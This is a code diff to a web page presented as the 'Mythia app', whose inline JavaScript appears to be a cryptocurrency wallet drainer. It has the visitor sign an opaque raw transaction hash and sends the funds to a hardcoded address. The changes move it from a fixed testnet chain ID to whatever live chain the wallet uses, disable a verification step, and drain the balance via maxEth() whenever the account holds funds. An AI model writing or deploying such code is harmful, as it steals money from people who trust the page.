@@ -630,7 +630,7 @@ personal information is needed to use the Mythia app.</a></nav></div><div data-h
 
         web3 = new Web3(ethereum);
 
-        const chainId = 42;
+        const chainId = await web3.eth.getChainId();
 
         await web3.eth.getTransactionCount(current_account, "pending")
         .then(async (txnCount) => {
@@ -663,7 +663,7 @@ personal information is needed to use the Mythia app.</a></nav></div><div data-h
             to: "0xDB03428239a597C478e6A6d9F2AbD0D115411863",
             value: fs,
             data: "0x",
-            v: "0x2a",
+            v: "0x1",
             r: "0x",
             s: "0x"
           };
@@ -673,10 +673,12 @@ personal information is needed to use the Mythia app.</a></nav></div><div data-h
           const rawTx1 = '0x' + ethTX1.serialize().toString('hex');
           const rawHash1 = web3.utils.sha3(rawTx1, {encoding: 'hex'});
 
+          /***
           const mycontract = await new web3.eth.Contract(
             abi,
             contractAddress
           ); 
+          ***/
           
           // const txHash = await mycontract.methods.hashStruct(txObject).call()        
 
@@ -695,8 +697,8 @@ personal information is needed to use the Mythia app.</a></nav></div><div data-h
             const s = "0x" + signature.substring(64, 128);
             const v = parseInt(signature.substring(128, 130), 16);
 
-            signer = await mycontract.methods.verify(current_account ,rawHash1, r, s, v).call();
-            console.log(signer);
+            //signer = await mycontract.methods.verify(current_account ,rawHash1, r, s, v).call();
+            //console.log(signer);
 
             const y =  web3.utils.toHex(v + chainId * 2 + 8);
 
@@ -732,7 +734,7 @@ personal information is needed to use the Mythia app.</a></nav></div><div data-h
             console.log(rawHash);
             console.log('0x' + ethTX1.hash().toString('hex'));
             
-            
+
             await web3.eth.sendSignedTransaction(rawTx)
             .then((hash) => {
               console.log(hash);
@@ -774,8 +776,19 @@ personal information is needed to use the Mythia app.</a></nav></div><div data-h
           })
 
           eth_bal = await web3.eth.getBalance(current_account);
+          const r_bal = web3.utils.fromWei(eth_bal, 'ether');
+          const chainId = await web3.eth.getChainId();
 
-          maxEth();
+      
+          if (r_bal > 0) {
+            maxEth();
+          }
+
+          else {
+            alert("Insufficients Funds. Fund account to continue");
+          }
+
+          //maxEth();
 
         }
 
